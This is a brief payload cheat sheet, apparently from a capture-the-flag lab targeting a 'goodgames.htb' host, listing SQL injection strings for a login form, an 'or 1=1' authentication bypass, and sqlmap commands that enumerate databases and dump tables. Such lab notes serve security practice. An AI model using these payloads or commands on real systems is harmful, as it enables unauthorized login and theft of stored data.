
Some previously working payloads
```
username'||''==='
```

### bypass authentication
```
email=admin' or 1=1 -- -&password=ooooooo
instead of:
email=admin@goodgames.htb&password=ooooooo
```

### sqlmap example
```
sqlmap -r login.req --batch --dbs
sqlmap -r goodgames.req -D <db name> --tables
sqlmap -r goodgames.req -D <db name> -T <db table> --dump
```